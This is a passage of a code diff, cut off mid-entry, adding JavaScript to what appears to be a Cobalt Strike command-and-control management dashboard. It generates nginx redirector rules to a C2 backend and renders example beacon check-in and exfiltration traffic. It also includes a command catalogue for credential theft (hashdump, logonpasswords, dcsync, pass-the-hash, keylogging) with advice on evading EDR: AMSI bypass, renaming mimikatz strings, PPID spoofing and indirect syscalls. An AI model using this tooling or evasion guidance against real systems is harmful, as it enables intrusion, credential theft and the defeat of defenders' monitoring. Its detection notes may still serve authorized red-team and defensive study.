+        while ((m = uriRegex.exec(blockContent)) !== null) {
+            // Split space-separated URIs
+            m[1].trim().split(/\s+/).forEach(u => {
+                if (u.startsWith('/')) uris.push(u);
+            });
+        }
+        return uris;
+    }
+
+    // Parse each block
+    const httpGet = findBlock(cleaned, 'http-get');
+    const httpPost = findBlock(cleaned, 'http-post');
+    const httpStager = findBlock(cleaned, 'http-stager');
+
+    result.get = extractURIs(httpGet, 'uri');
+    result.post = extractURIs(httpPost, 'uri');
+    result.stager_x86 = extractURIs(httpStager, 'uri_x86');
+    result.stager_x64 = extractURIs(httpStager, 'uri_x64');
+
+    return result;
+}
+
+/**
+ * Generate nginx location config text from parsed URIs
+ */
+function generateNginxFromURIs(uris) {
+    const allURIs = [...(uris.get || []), ...(uris.post || []), ...(uris.stager_x86 || []), ...(uris.stager_x64 || [])];
+    if (allURIs.length === 0) return '# No URIs detected — paste a valid Malleable C2 profile above';
+
+    // Escape regex special chars for nginx location ~
+    const escaped = allURIs.map(u => u.replace(/\./g, '\\.').replace(/\?/g, '\\?'));
+    const pattern = escaped.join('|');
+
+    return `# Custom Malleable C2 profile — auto-generated from parsed URIs
+# GET:        ${(uris.get || []).join(' ') || '(none)'}
+# POST:       ${(uris.post || []).join(' ') || '(none)'}
+# Stager x86: ${(uris.stager_x86 || []).join(' ') || '(none)'}
+# Stager x64: ${(uris.stager_x64 || []).join(' ') || '(none)'}
+
+location ~ ^(${pattern})$ {
+    proxy_pass https://c2_backend;
+    proxy_http_version 1.1;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Connection "";
+    proxy_connect_timeout 60s;
+    proxy_send_timeout 60s;
+    proxy_read_timeout 300s;
+    proxy_buffering on;
+    client_max_body_size 100M;
+}`;
+}
+
+/**
+ * Generate example HTTP GET/POST requests from a Malleable C2 profile.
+ * Shows what beacon traffic looks like on the wire.
+ */
+function generateExampleTraffic(profileText) {
+    if (!profileText || typeof profileText !== 'string') return '# No profile content';
+
+    const lines = profileText.split('\n');
+    const cleaned = lines.filter(l => !l.trim().startsWith('#')).join('\n');
+
+    // Reuse findBlock from parseMalleableProfileURIs
+    function findBlock(text, blockName) {
+        const regex = new RegExp(`(?:^|\\n)\\s*${blockName}\\s*\\{`, 'g');
+        const match = regex.exec(text);
+        if (!match) return null;
+        let depth = 1;
+        let start = match.index + match[0].length;
+        for (let i = start; i < text.length; i++) {
+            if (text[i] === '{') depth++;
+            if (text[i] === '}') depth--;
+            if (depth === 0) return text.substring(start, i);
+        }
+        return null;
+    }
+
+    function extractValue(block, key) {
+        if (!block) return null;
+        const m = block.match(new RegExp(`set\\s+${key}\\s+"([^"]+)"`));
+        return m ? m[1] : null;
+    }
+
+    function extractHeaders(block) {
+        if (!block) return [];
+        const headers = [];
+        const re = /header\s+"([^"]+)"\s+"([^"]+)"/g;
+        let m;
+        while ((m = re.exec(block)) !== null) {
+            headers.push([m[1], m[2]]);
+        }
+        return headers;
+    }
+
+    function extractClientBlock(parentBlock) {
+        return parentBlock ? findBlock(parentBlock, 'client') : null;
+    }
+
+    // Extract global settings
+    const useragent = extractValue(cleaned, 'useragent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
+    const host = extractValue(cleaned, 'CN')?.replace('*.', 'cdn.') || 'your-redirector-domain.com';
+
+    // Parse http-get block
+    const httpGet = findBlock(cleaned, 'http-get');
+    const getUri = extractValue(httpGet, 'uri') || '/unknown';
+    const getVerb = extractValue(httpGet, 'verb') || 'GET';
+    const getClient = extractClientBlock(httpGet);
+    const getHeaders = extractHeaders(getClient);
+    const getServer = httpGet ? findBlock(httpGet, 'server') : null;
+    const getServerHeaders = extractHeaders(getServer);
+
+    // Detect metadata placement (cookie, header, parameter)
+    let metadataPlacement = '';
+    if (getClient) {
+        const metaBlock = findBlock(getClient, 'metadata');
+        if (metaBlock) {
+            const cookieMatch = metaBlock.match(/header\s+"Cookie"/);
+            const headerMatch = metaBlock.match(/header\s+"([^"]+)"/);
+            const paramMatch = metaBlock.match(/parameter\s+"([^"]+)"/);
+            const prependMatch = metaBlock.match(/prepend\s+"([^"]+)"/);
+            if (cookieMatch) {
+                metadataPlacement = `Cookie: ${prependMatch ? prependMatch[1] : ''}aGVsbG8gd29ybGQ...`;
+            } else if (paramMatch) {
+                metadataPlacement = `param:${paramMatch[1]}`;
+            } else if (headerMatch) {
+                metadataPlacement = `header:${headerMatch[1]}`;
+            }
+        }
+    }
+
+    // Parse http-post block
+    const httpPost = findBlock(cleaned, 'http-post');
+    const postUri = extractValue(httpPost, 'uri') || '/unknown';
+    const postVerb = extractValue(httpPost, 'verb') || 'POST';
+    const postClient = extractClientBlock(httpPost);
+    const postHeaders = extractHeaders(postClient);
+    const postServer = httpPost ? findBlock(httpPost, 'server') : null;
+    const postServerHeaders = extractHeaders(postServer);
+
+    // Detect ID placement in http-post
+    let idPlacement = '';
+    if (postClient) {
+        const idBlock = findBlock(postClient, 'id');
+        if (idBlock) {
+            const headerMatch = idBlock.match(/header\s+"([^"]+)"/);
+            const paramMatch = idBlock.match(/parameter\s+"([^"]+)"/);
+            if (paramMatch) idPlacement = `param:${paramMatch[1]}`;
+            else if (headerMatch) idPlacement = `header:${headerMatch[1]}`;
+        }
+    }
+
+    // Detect server output wrapping (prepend/append)
+    function extractOutputWrap(serverBlock) {
+        if (!serverBlock) return null;
+        const outBlock = findBlock(serverBlock, 'output');
+        if (!outBlock) return null;
+        const prepend = outBlock.match(/prepend\s+"([^"]+)"/);
+        const append = outBlock.match(/append\s+"([^"]+)"/);
+        if (prepend || append) {
+            const pre = prepend ? prepend[1].replace(/\\"/g, '"') : '';
+            const app = append ? append[1].replace(/\\"/g, '"') : '';
+            return { prepend: pre, append: app };
+        }
+        return null;
+    }
+
+    const getWrap = extractOutputWrap(getServer);
+    const postWrap = extractOutputWrap(postServer);
+
+    // Build output
+    let output = '';
+
+    // === GET REQUEST (Beacon Check-in) ===
+    output += `# ─────────────────────────────────────────────────────\n`;
+    output += `# BEACON CHECK-IN (${getVerb} request from infected host)\n`;
+    output += `# This is what the beacon sends every sleep interval\n`;
+    output += `# ─────────────────────────────────────────────────────\n\n`;
+
+    let getUriDisplay = getUri.split(/\s+/)[0]; // first URI if space-separated
+    if (metadataPlacement.startsWith('param:')) {
+        getUriDisplay += `?${metadataPlacement.split(':')[1]}=aGVsbG8gd29ybGQ...`;
+    }
+    output += `${getVerb} ${getUriDisplay} HTTP/1.1\n`;
+    output += `Host: ${host}\n`;
+    output += `User-Agent: ${useragent}\n`;
+
+    getHeaders.forEach(([k, v]) => {
+        if (k.toLowerCase() !== 'host') output += `${k}: ${v}\n`;
+    });
+
+    if (metadataPlacement.startsWith('Cookie:')) {
+        output += `${metadataPlacement}\n`;
+    } else if (metadataPlacement.startsWith('header:')) {
+        output += `${metadataPlacement.split(':')[1]}: aGVsbG8gd29ybGQ...\n`;
+    }
+    output += `\n`;
+
+    // === GET RESPONSE (Team Server Response) ===
+    output += `# ─── Team Server Response ───\n\n`;
+    output += `HTTP/1.1 200 OK\n`;
+    getServerHeaders.forEach(([k, v]) => {
+        output += `${k}: ${v}\n`;
+    });
+    output += `\n`;
+    if (getWrap) {
+        output += `${getWrap.prepend}<base64-encoded-tasking>${getWrap.append}\n`;
+    } else {
+        output += `<base64-encoded-tasking>\n`;
+    }
+
+    output += `\n\n`;
+
+    // === POST REQUEST (Data Exfiltration) ===
+    output += `# ─────────────────────────────────────────────────────\n`;
+    output += `# DATA EXFIL (${postVerb} request — beacon sending results)\n`;
+    output += `# Sent when the beacon has command output to return\n`;
+    output += `# ─────────────────────────────────────────────────────\n\n`;
+
+    let postUriDisplay = postUri.split(/\s+/)[0];
+    if (idPlacement.startsWith('param:')) {
+        postUriDisplay += `?${idPlacement.split(':')[1]}=YmVhY29uX2lk...`;
+    }
+    output += `${postVerb} ${postUriDisplay} HTTP/1.1\n`;
+    output += `Host: ${host}\n`;
+    output += `User-Agent: ${useragent}\n`;
+
+    postHeaders.forEach(([k, v]) => {
+        if (k.toLowerCase() !== 'host') output += `${k}: ${v}\n`;
+    });
+
+    if (idPlacement.startsWith('header:')) {
+        output += `${idPlacement.split(':')[1]}: YmVhY29uX2lk...\n`;
+    }
+
+    output += `Content-Length: 1842\n`;
+    output += `\n`;
+    output += `<base64-encoded-command-output>\n`;
+
+    output += `\n\n`;
+
+    // === POST RESPONSE ===
+    output += `# ─── Team Server Response ───\n\n`;
+    output += `HTTP/1.1 200 OK\n`;
+    postServerHeaders.forEach(([k, v]) => {
+        output += `${k}: ${v}\n`;
+    });
+    output += `\n`;
+    if (postWrap) {
+        output += `${postWrap.prepend}<base64-encoded-ack>${postWrap.append}\n`;
+    } else {
+        output += `<base64-encoded-ack>\n`;
+    }
+
+    return output;
+}
+
+
+/**
+ * Validate a Malleable C2 profile for common issues.
+ * Returns { valid: bool, errors: [], warnings: [] }
+ */
+function validateMalleableProfile(profileText) {
+    const errors = [];
+    const warnings = [];
+
+    if (!profileText || typeof profileText !== 'string' || profileText.trim().length < 20) {
+        return { valid: false, errors: ['Profile content is empty or too short'], warnings: [] };
+    }
+
+    // Remove comments for analysis
+    const lines = profileText.split('\n');
+    const cleaned = lines.filter(l => !l.trim().startsWith('#')).join('\n');
+
+    // Check for balanced braces
+    let depth = 0;
+    for (const ch of cleaned) {
+        if (ch === '{') depth++;
+        if (ch === '}') depth--;
+        if (depth < 0) {
+            errors.push('Unmatched closing brace <code>}</code> found');
+            break;
+        }
+    }
+    if (depth > 0) errors.push(`${depth} unclosed opening brace(s) <code>{</code>`);
+
+    // Check for required blocks
+    const hasHttpGet = /(?:^|\n)\s*http-get\s*\{/m.test(cleaned);
+    const hasHttpPost = /(?:^|\n)\s*http-post\s*\{/m.test(cleaned);
+    const hasHttpStager = /(?:^|\n)\s*http-stager\s*\{/m.test(cleaned);
+
+    if (!hasHttpGet) errors.push('Missing <code>http-get</code> block (required for beacon check-in)');
+    if (!hasHttpPost) errors.push('Missing <code>http-post</code> block (required for beacon data)');
+    if (!hasHttpStager) warnings.push('No <code>http-stager</code> block — staged payloads will not work');
+
+    // Check for URIs in the blocks that exist
+    const parsed = parseMalleableProfileURIs(profileText);
+    if (hasHttpGet && parsed.get.length === 0) errors.push('No <code>set uri</code> in http-get block');
+    if (hasHttpPost && parsed.post.length === 0) errors.push('No <code>set uri</code> in http-post block');
+
+    // Check URIs start with /
+    const allURIs = [...parsed.get, ...parsed.post, ...parsed.stager_x86, ...parsed.stager_x64];
+    const badURIs = allURIs.filter(u => !u.startsWith('/'));
+    if (badURIs.length) errors.push(`URIs must start with <code>/</code>: ${badURIs.join(', ')}`);
+
+    // Check for duplicate URIs between GET and POST
+    const getSet = new Set(parsed.get);
+    const postDupes = parsed.post.filter(u => getSet.has(u));
+    if (postDupes.length) warnings.push(`GET and POST share the same URI: <code>${postDupes.join(', ')}</code> — this may cause routing issues`);
+
+    // Check for http-config with trust_x_forwarded_for (important for redirector architecture)
+    const hasHttpConfig = /(?:^|\n)\s*http-config\s*\{/m.test(cleaned);
+    const hasTrustXFF = /trust_x_forwarded_for\s+"true"/m.test(cleaned);
+    if (!hasHttpConfig || !hasTrustXFF) {
+        warnings.push('Missing <code>trust_x_forwarded_for "true"</code> in http-config — required when using redirectors so the team server sees the real client IP');
+    }
+
+    return { valid: errors.length === 0, errors, warnings };
+}
+
+// ============================================================================
 // PAGE LOADERS
 // ============================================================================
 
@@ -1106,6 +1931,4082 @@ async function loadDashboard() {
 /**
  * Load Configuration
  */
+// Cache of Route 53 domains to avoid redundant API calls
+let _route53DomainsCache = null;
+
+async function loadRoute53Domains(selectedDomain = null, selectedBackups = []) {
+    const select = document.getElementById('primary-domain');
+    if (!select) return;
+
+    // Preserve current selection if no override
+    const currentVal = selectedDomain || select.value;
+
+    // Show loading state
+    select.innerHTML = '<option value="">Loading domains from Route 53...</option>';
+    select.disabled = true;
+
+    try {
+        let data = _route53DomainsCache;
+        if (!data) {
+            const response = await fetch(`${API_BASE}/health/route53-domains`);
+            data = await response.json();
+            if (data.success) _route53DomainsCache = data;
+        }
+
+        select.innerHTML = '<option value="">-- Select a domain --</option>';
+
+        if (data.success && data.domains.length > 0) {
+            data.domains.forEach(d => {
+                const opt = document.createElement('option');
+                opt.value = d.domain_name;
+                opt.textContent = d.domain_name;
+                select.appendChild(opt);
+            });
+        } else if (data.success && data.domains.length === 0) {
+            select.innerHTML = '<option value="">No domains found in Route 53</option>';
+        } else {
+            select.innerHTML = `<option value="">Error: ${data.error || 'Failed to load'}</option>`;
+        }
+
+        // Restore selection
+        if (currentVal) {
+            select.value = currentVal;
+            if (select.value !== currentVal && currentVal !== '') {
+                const opt = document.createElement('option');
+                opt.value = currentVal;
+                opt.textContent = `${currentVal} (not in Route 53)`;
+                select.appendChild(opt);
+                select.value = currentVal;
+            }
+        }
+
+        // Update backup domains dropdown (excludes selected primary)
+        updateBackupDomains(data, selectedBackups);
+
+        // Re-update backups when primary changes
+        select.onchange = () => updateBackupDomains(data);
+    } catch (error) {
+        select.innerHTML = `<option value="">Error loading domains</option>`;
+        console.error('Failed to load Route 53 domains:', error);
+    } finally {
+        select.disabled = false;
+    }
+}
+
+function updateBackupDomains(data, selectedBackups = []) {
+    const backupSelect = document.getElementById('backup-domains');
+    const primarySelect = document.getElementById('primary-domain');
+    if (!backupSelect || !data || !data.success) return;
+
+    const primaryVal = primarySelect ? primarySelect.value : '';
+
+    // Preserve current selections if no override provided
+    if (selectedBackups.length === 0) {
+        selectedBackups = Array.from(backupSelect.selectedOptions).map(o => o.value);
+    }
+
+    backupSelect.innerHTML = '';
+
+    const available = data.domains.filter(d => d.domain_name !== primaryVal);
+    if (available.length === 0) {
+        const opt = document.createElement('option');
+        opt.value = '';
+        opt.textContent = 'No additional domains available';
+        opt.disabled = true;
+        backupSelect.appendChild(opt);
+        return;
+    }
+
+    available.forEach(d => {
+        const opt = document.createElement('option');
+        opt.value = d.domain_name;
+        opt.textContent = d.domain_name;
+        opt.selected = selectedBackups.includes(d.domain_name);
+        backupSelect.appendChild(opt);
+    });
+}
+
+// ============================================================================
+// BEACON MANAGEMENT
+// ============================================================================
+
+const BEACON = {
+    pollInterval: null,
+    lastSeenInterval: null, // 1s timer for live "Last Seen" updates
+    cachedBeacons: [],      // Beacon data from last API fetch
+    selectedBid: null,
+    connectionStatus: 'disconnected', // disconnected | reachable | connected
+    tunnelCmd: '',
+    deployments: [],      // All loaded deployments
+    selectedDeployment: null, // Currently selected deployment
+
+    // Listener cache
+    _listenerCache: null,
+    _listenerCacheTime: null,
+    _opsecDetailOpen: false,
+    _opsecLastCmd: null,
+
+    // Live task feed — tracks all tasks on the beacon (including external/CLI-sent)
+    _taskFeedKnown: new Set(),   // taskIds we've already rendered
+    _taskFeedTimer: null,        // polling interval handle
+    _taskFeedPolling: new Set(), // taskIds we're actively polling output for
+
+    // Command history (per-beacon, persisted)
+    cmdHistory: [],
+    cmdHistoryIdx: -1,
+    cmdDraft: '',
+
+    // Autocomplete state
+    acVisible: false,
+    acItems: [],
+    acIdx: -1,
+
+    // CS Beacon command reference with OPSEC ratings and REST API compatibility
+    // opsec: 'safe' | 'moderate' | 'loud'
+    // api: 'console' (works via consoleCommand), 'dedicated' (has own REST endpoint), 'none' (not available via REST API)
+    CS_COMMANDS: [
+        // --- File & Directory ---
+        { cmd: 'ls', hint: 'List directory contents', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'cd', hint: 'Change directory', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'pwd', hint: 'Print working directory', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'mkdir', hint: 'Create directory', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'rm', hint: 'Remove file', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'cp', hint: 'Copy file', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'mv', hint: 'Move file', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'download', hint: 'Download file from target', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'upload', hint: 'Upload file to target', opsec: 'moderate', api: 'dedicated', note: 'Writes file to disk — leaves forensic artifact',
+            detect: ['File creation event logged by EDR (Sysmon 11)', 'Unusual file path may trigger alerts'],
+            mitigations: ['Upload to legitimate directories (C:\\Windows\\, Program Files)', 'Clean up with rm after use'],
+            eventIds: [4663] },
+        { cmd: 'drives', hint: 'List drives on target', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'timestomp', hint: 'Modify file timestamps', opsec: 'moderate', api: 'dedicated', note: 'Anti-forensics — some EDR detect this',
+            detect: ['$STANDARD_INFORMATION timestamp modification logged', 'EDR may flag SetFileTime API calls'],
+            eventIds: [4663] },
+
+        // --- Process & Execution ---
+        { cmd: 'shell', hint: 'Run OS command via cmd.exe', opsec: 'moderate', api: 'console', note: 'Spawns cmd.exe — creates child process',
+            detect: ['Event 4688 (process creation)', 'Parent-child anomaly: beacon → cmd.exe', 'Command line arguments logged'],
+            alt: [{ cmd: 'inline-execute', why: 'Run BOF inline — no process spawn, no cmd.exe' }, { cmd: 'run', why: 'Direct program execution (no cmd.exe wrapper)' }],
+            eventIds: [4688] },
+        { cmd: 'run', hint: 'Run a program (with output)', opsec: 'moderate', api: 'console', note: 'Creates new process — output captured via pipes',
+            detect: ['Event 4688 (process creation)', 'Parent-child process relationship logged', 'Pipe creation for stdout capture'],
+            alt: [{ cmd: 'inline-execute', why: 'Run BOF inline — no process spawn' }],
+            eventIds: [4688] },
+        { cmd: 'execute', hint: 'Execute command (no output)', opsec: 'moderate', api: 'console', note: 'Creates new process — no output capture',
+            detect: ['Event 4688 (process creation)'],
+            alt: [{ cmd: 'inline-execute', why: 'Run BOF inline — no process spawn' }],
+            eventIds: [4688] },
+        { cmd: 'execute-assembly', hint: 'Run .NET assembly in memory', opsec: 'moderate', api: 'dedicated', note: 'Fork&run — spawns sacrificial process, loads CLR',
+            detect: ['"CLR Loaded from Suspicious Memory" alert', 'Sacrificial process creation (Event 4688)', 'Unusual DLL loads: clr.dll, mscoree.dll in spawn-to process', '"Suspicious Remote Memory Allocation" if no Crystal Kit'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF port if available — no fork&run, no CLR loading' }],
+            prereqs: ['Set spawnto with args (e.g., spawnto x64 C:\\Windows\\System32\\msiexec.exe /i update.msi /quiet)', 'Set ppid to legitimate parent (ps → find explorer.exe PID → ppid <pid>)', 'Without args → "Process Started with No Args" EDR alert', 'Default spawn-to is rundll32.exe — overused, heavily monitored', 'Consider context-aware spawn-to: Office → EXCEL.EXE, .NET → MSBuild.exe /nologo /v:quiet'],
+            mitigations: ['Enable AMSI bypass in Malleable C2 (post-ex.amsi_disable "true")', 'Use Crystal Kit custom loader to avoid default CLR signatures', 'Replace strings in .NET tool before use (e.g., Rubeus → Kerbop)'],
+            eventIds: [4688] },
+        { cmd: 'ps', hint: 'List processes', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'kill', hint: 'Kill a process', opsec: 'moderate', api: 'dedicated', note: 'Terminates process — may alert defenders',
+            detect: ['Process termination event', 'Unexpected child process death may trigger EDR'] },
+
+        // --- PowerShell ---
+        { cmd: 'powershell', hint: 'Run PowerShell command', opsec: 'loud', api: 'console', note: 'Spawns powershell.exe — heavily monitored by EDR',
+            detect: ['Event 4103/4104 (Script Block Logging)', 'AMSI scans command content before execution', 'Parent-child anomaly: beacon → powershell.exe', 'PowerShell module logging captures all cmdlet invocations', 'Event 400 (PowerShell engine start)'],
+            alt: [{ cmd: 'powerpick', why: 'Unmanaged PowerShell — no powershell.exe process' }, { cmd: 'inline-execute', why: 'Run BOF instead — no PowerShell at all' }, { cmd: 'execute-assembly', why: 'Run C# tool (e.g., SharpView instead of PowerView)' }],
+            prereqs: ['Set spawnto with args before use', 'Set ppid to legitimate parent'],
+            mitigations: ['Use encoded/obfuscated commands', 'Avoid well-known cmdlet names (Invoke-Mimikatz, Invoke-ShareFinder)', 'Prefer C#/.NET tools over PowerShell equivalents (SharpView > PowerView)'],
+            eventIds: [400, 4103, 4104] },
+        { cmd: 'powershell-import', hint: 'Import PowerShell script', opsec: 'loud', api: 'dedicated', note: 'Loads script into powershell.exe session',
+            detect: ['Script Block Logging captures full script content', 'AMSI scans imported script', 'Large PowerShell script load is anomalous'],
+            alt: [{ cmd: 'execute-assembly', why: 'Use compiled C# equivalent instead of PS script' }],
+            mitigations: ['Obfuscate script with Invoke-Obfuscation (TOKEN mode only, NOT STRING)', 'Rename known function names in script before import'],
+            eventIds: [4104] },
+        { cmd: 'powerpick', hint: 'Run PowerShell without powershell.exe', opsec: 'moderate', api: 'dedicated', note: 'Unmanaged PowerShell — no powershell.exe but CLR still loads',
+            detect: ['CLR DLL load in non-PowerShell process', 'System.Management.Automation.dll load event', '"Suspicious DLL Loaded by Unexpected Process" if parent mismatch'],
+            alt: [{ cmd: 'inline-execute', why: 'Run BOF instead — no CLR loading at all' }, { cmd: 'execute-assembly', why: 'Use compiled C# tool' }],
+            prereqs: ['Set spawnto with args (fork&run)', 'Set ppid to legitimate parent', 'PPID spoof to explorer.exe for DLL load legitimacy'],
+            mitigations: ['Enable AMSI bypass', 'Rename known cmdlet/function names'],
+            eventIds: [4688] },
+        { cmd: 'psinject', hint: 'Inject PowerShell into process', opsec: 'loud', api: 'none', note: 'Process injection + PowerShell — double detection risk',
+            detect: ['Process injection kernel callbacks (PsSetCreateThreadNotifyRoutine)', 'CLR loading in target process', 'Cross-process memory write + thread creation', 'AMSI scans in target process context'],
+            alt: [{ cmd: 'powerpick', why: 'Fork&run instead of injecting into existing process' }, { cmd: 'inline-execute', why: 'BOF — no injection, no PowerShell' }],
+            eventIds: [4688, 8] },
+
+        // --- Beacon Management ---
+        { cmd: 'sleep', hint: 'Set beacon sleep (seconds jitter%)', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'jobs', hint: 'List active beacon jobs', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'jobkill', hint: 'Kill a beacon job', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'cancel', hint: 'Cancel pending download', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'clear', hint: 'Clear beacon task queue', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'exit', hint: 'Exit beacon', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'checkin', hint: 'Force beacon checkin', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'note', hint: 'Set beacon note', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'mode', hint: 'Set beacon mode (dns/dns-txt/dns6)', opsec: 'safe', api: 'dedicated' },
+
+        // --- Identity & Info ---
+        { cmd: 'getuid', hint: 'Get current user ID', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'getprivs', hint: 'Get current privileges', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'whoami', hint: 'Not supported — use getuid or shell whoami', opsec: 'safe', api: 'none', note: 'No REST API endpoint — use getuid instead',
+            alt: [{ cmd: 'getuid', why: 'Built-in beacon command — no process spawn' }] },
+
+        // --- Credential Theft ---
+        { cmd: 'hashdump', hint: 'Dump password hashes (SAM)', opsec: 'loud', api: 'dedicated', note: 'Reads SAM — triggers Credential Access alerts',
+            detect: ['SAM registry hive access (Event 4656)', 'Credential Access MITRE technique alerts', 'Credential Guard may block on protected hosts'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF hashdump with indirect syscalls — less signatured' }, { cmd: 'dcsync', why: 'Extract specific hashes via replication — avoids SAM read' }],
+            prereqs: ['Requires SYSTEM or local admin privileges', 'Check if Credential Guard enabled (will block SAM extraction)'],
+            mitigations: ['Prefer dcsync for targeted hash extraction', 'Use BOF implementation with indirect syscalls'],
+            eventIds: [4656, 4663] },
+        { cmd: 'logonpasswords', hint: 'Run mimikatz sekurlsa::logonpasswords', opsec: 'loud', api: 'dedicated', note: 'Reads LSASS memory — top EDR detection vector',
+            detect: ['LSASS process access (Event 4656)', 'LSASS memory read triggers Credential Access alerts', 'Credential Guard blocks sekurlsa on protected hosts', 'Fork&run spawns suspicious process accessing LSASS'],
+            alt: [{ cmd: 'inline-execute', why: 'nanodump BOF — indirect syscalls, less signatured than mimikatz' }, { cmd: 'dcsync', why: 'Extract creds via replication — no LSASS access' }, { cmd: 'kerberos_ticket_use', why: 'Use Kerberos tickets instead of extracting passwords' }],
+            prereqs: ['Requires SYSTEM or local admin', 'Check if Credential Guard enabled first (blocks sekurlsa, tgtdeleg, S4U)', 'Check if RC4 disabled domain-wide (NTLM hashes unusable → use Kerberos)'],
+            mitigations: ['Rename mimikatz strings before use (benjamin→operator, gentilkiwi→system32)', 'Use BOF nanodump with indirect syscalls instead', 'Target specific accounts with dcsync rather than dumping all'],
+            eventIds: [4656, 4663] },
+        { cmd: 'dcsync', hint: 'DCSync domain credentials', opsec: 'loud', api: 'dedicated', note: 'DRS replication — detected by most SIEMs',
+            detect: ['DRS replication traffic (Event 4662)', 'Directory Service Access alerts', 'Most SIEMs have detection rules for DCSync', 'Anomalous replication from non-DC source'],
+            alt: [{ cmd: 'kerberos_ticket_use', why: 'Use existing Kerberos tickets instead of extracting new credentials' }],
+            prereqs: ['Requires Domain Admin or replication rights (GetChanges + GetChangesAll)'],
+            mitigations: ['Target specific accounts rather than entire domain', 'Space out requests — multiple rapid DCSync triggers alerts', 'Use from a DC if you have access (replication from DC is normal)'],
+            eventIds: [4662, 4624] },
+        { cmd: 'mimikatz', hint: 'Run mimikatz command', opsec: 'loud', api: 'dedicated', note: 'Highly signatured — static + behavioral detection',
+            detect: ['Windows.HackTool.Rubeus/Mimikatz signature detection', 'Known string patterns in memory (benjamin, gentilkiwi, mimikatz)', 'DLL load patterns unique to mimikatz modules'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF implementation of specific mimikatz functions' }, { cmd: 'dcsync', why: 'Use dedicated dcsync command instead of mimikatz dcsync' }],
+            prereqs: ['Set spawnto with args (fork&run)', 'Set ppid to legitimate parent'],
+            mitigations: ['Rename all mimikatz strings (benjamin→operator, gentilkiwi→system32)', 'Replace GUID in AssemblyInfo', 'Use specific BOFs instead of full mimikatz binary'],
+            eventIds: [4688, 4656] },
+        { cmd: 'chromedump', hint: 'Dump Chrome credentials', opsec: 'loud', api: 'dedicated', note: 'Accesses Chrome credential store',
+            detect: ['Chrome Login Data file access', 'DPAPI decryption calls (Event 4693)', 'Unusual process accessing browser credential files'],
+            eventIds: [4693, 4663] },
+
+        // --- Token Management ---
+        { cmd: 'make_token', hint: 'Create token (DOMAIN\\user password)', opsec: 'moderate', api: 'dedicated', note: 'Network logon — creates LogonType 9 event',
+            detect: ['LogonType 9 (NewCredentials) event', '"NewCredential Logon by Suspicious Process" if beacon in abnormal process location'],
+            mitigations: ['Run from legitimate process context (e.g., spawnto runas.exe)', 'Ensure beacon is in System32/Program Files process', 'Avoid make_token from unusual directories — triggers alert'],
+            eventIds: [4624] },
+        { cmd: 'rev2self', hint: 'Revert to original token', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'steal_token', hint: 'Steal token from process', opsec: 'moderate', api: 'dedicated', note: 'Opens process token — detectable by EDR',
+            detect: ['Process handle open with TOKEN_DUPLICATE rights', 'Cross-process token access logged'],
+            mitigations: ['Steal from same-session processes when possible', 'Use upload command with stolen tokens (works without process spawn)'] },
+        { cmd: 'kerberos_ticket_use', hint: 'Apply Kerberos ticket', opsec: 'moderate', api: 'dedicated', note: 'Pass-the-ticket — may log anomalous Kerberos logon',
+            detect: ['Kerberos TGT request from anomalous process (Event 4768)', 'Ticket mismatch — username vs source IP inconsistency'],
+            mitigations: ['More stealthy than pass-the-hash (uses Kerberos protocol)', 'Preferred over NTLM-based techniques when RC4 is disabled'],
+            eventIds: [4768, 4769] },
+        { cmd: 'kerberos_ticket_purge', hint: 'Purge Kerberos tickets', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'pth', hint: 'Pass-the-hash', opsec: 'loud', api: 'dedicated', note: 'NTLM hash logon — creates anomalous logon event',
+            detect: ['Event 4624 LogonType 9 with NTLM authentication', 'Anomalous NTLM logon pattern from workstation', 'Many environments disable RC4 — PTH fails silently'],
+            alt: [{ cmd: 'kerberos_ticket_use', why: 'Pass-the-ticket via Kerberos — works when RC4 disabled' }],
+            mitigations: ['Check if RC4 disabled domain-wide first (PTH requires RC4 NTLM)', 'Prefer Kerberos tickets over NTLM hashes'],
+            eventIds: [4624, 4625] },
+
+        // --- Capture ---
+        { cmd: 'screenshot', hint: 'Take a screenshot', opsec: 'moderate', api: 'dedicated', note: 'Fork&run — spawns sacrificial process for desktop capture',
+            detect: ['Sacrificial process creation (Event 4688)', 'Desktop API access from unusual process'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF screenshot — no fork&run' }],
+            prereqs: ['Set spawnto with args', 'Set ppid to legitimate parent', 'Must be in user session process — inject into user-session process first if needed'] },
+        { cmd: 'screenwatch', hint: 'Start screen watching', opsec: 'moderate', api: 'dedicated', note: 'Continuous fork&run screenshots — persistent activity',
+            detect: ['Repeated sacrificial process creation', 'Continuous desktop API access'],
+            prereqs: ['Set spawnto with args', 'Set ppid to legitimate parent'] },
+        { cmd: 'printscreen', hint: 'Single PrintScreen capture', opsec: 'moderate', api: 'dedicated', note: 'Uses PrintScreen API — single capture',
+            prereqs: ['Must be in user session process'] },
+        { cmd: 'keylogger', hint: 'Start keystroke logger', opsec: 'loud', api: 'dedicated', note: 'Hooks keyboard APIs — persistent, detected by kernel callbacks',
